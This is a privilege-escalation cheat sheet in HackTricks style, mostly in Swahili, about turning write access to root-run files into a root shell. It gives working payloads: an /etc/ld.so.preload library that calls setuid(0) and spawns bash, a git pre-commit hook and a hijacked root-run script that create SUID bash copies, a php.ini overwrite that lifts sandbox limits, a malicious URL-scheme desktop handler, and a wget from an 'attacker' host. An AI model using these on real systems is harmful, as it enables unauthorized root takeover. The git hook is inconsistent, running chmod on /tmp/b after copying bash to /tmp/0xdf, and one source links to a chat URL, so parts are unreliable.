# Kuandika faili yoyote kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hii inafanya kazi kama **`LD_PRELOAD`** env variable lakini pia inafanya kazi kwenye **SUID binaries**.\
Ikiwa unaweza kuunda au kuibadilisha, unaweza kuongeza tu **path to a library that will be loaded** with each executed binary.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo **run** kwenye **events** mbalimbali katika git repository kama wakati commit inapotengenezwa, merge... Kwa hivyo, ikiwa **privileged script or user** anafanya vitendo hivi mara kwa mara na inawezekana **write in the `.git` folder**, hii inaweza kutumika kwa **privesc**.

For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Faili za Wakati

TODO

### Faili za Huduma na Socket

TODO

### Kuandika tena `php.ini` yenye vizuizi inayotumika na sandbox ya PHP yenye ruhusa za juu

Baadhi ya daemons maalum huthibitisha PHP iliyoletwa na mtumiaji kwa kuendesha `php` kwa kutumia **restricted `php.ini`** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa msimbo ulioko ndani ya sandbox bado una **any write primitive** (kama `file_put_contents`) na unaweza kufikia **exact `php.ini` path** inayotumika na daemon, unaweza **overwrite that config** ili kuondoa vikwazo kisha kutuma payload ya pili inayotekelezwa kwa ruhusa zilizoinuliwa.

Mtiririko wa kawaida:

1. Payload ya kwanza inaoverwrite config ya sandbox.
2. Payload ya pili inatekeleza msimbo sasa kwamba dangerous functions zimeruhusiwa tena.

Mfano wa msingi (badilisha njia inayotumika na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inakimbia kama root (au inathibitisha kwa root-owned paths), utekelezaji wa pili unatoa muktadha wa root. Hii kwa vitendo ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika faili.

### binfmt_misc

Faili iliyopo katika `/proc/sys/fs/binfmt_misc` inaonyesha binary gani inapaswa kutekeleza aina gani ya faili. TODO: angalia vigezo vya kutumia hili kutekeleza rev shell wakati aina ya faili ya kawaida iko wazi.

### Kuandika upya schema handlers (kama http: au https:)

Mshambuliaji mwenye ruhusa za kuandika kwenye saraka za usanidi za mwathiri anaweza kwa urahisi kubadilisha au kuunda faili ambazo zinabadilisha tabia ya mfumo, zikasababisha utekelezaji wa msimbo usiotarajiwa. Kwa kubadilisha faili `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwa faili ya kuharibu (mfano, kuweka `x-scheme-handler/http=evil.desktop`), mshambuliaji anahakikisha kwamba **kufungua kiungo chochote cha http au https kunasababisha msimbo uliobainishwa katika faili hiyo `evil.desktop`**. Kwa mfano, baada ya kuweka msimbo ufuatao wa kuharibu katika `evil.desktop` kwenye `$HOME/.local/share/applications`, bonyeza yoyote ya URL za nje inaendesha amri iliyowekwa:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Kwa maelezo zaidi angalia [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumiwa ku-exploit a real vulnerability.

### Root akiendesha scripts/binaries zinazoweza kuandikwa na mtumiaji

Kama workflow yenye ruhusa inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na mtumiaji asiye na ruhusa), unaweza ku-hijack:

- **Gundua utekelezaji:** fuatilia michakato kwa kutumia [pspy](https://github.com/DominicBreuker/pspy) ili kumkamata root anapoita njia zinazodhibitiwa na mtumiaji:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** Hakikisha faili lengwa na saraka yake vinamilikiwa na vinaweza kuandikwa na mtumiaji wako.
- **Hijack the target:** Fanya chelezo ya binary/script ya asili na weka payload inayounda SUID shell (au hatua nyingine yoyote ya root), kisha rejesha ruhusa:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Chochea kitendo chenye ruhusa za juu** (kwa mfano, kubonyeza kitufe cha UI kinachozalisha msaidizi). Wakati root atakapotekeleza tena hijacked path, chukua escalated shell na `./rootshell -p`.

## Marejeo

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
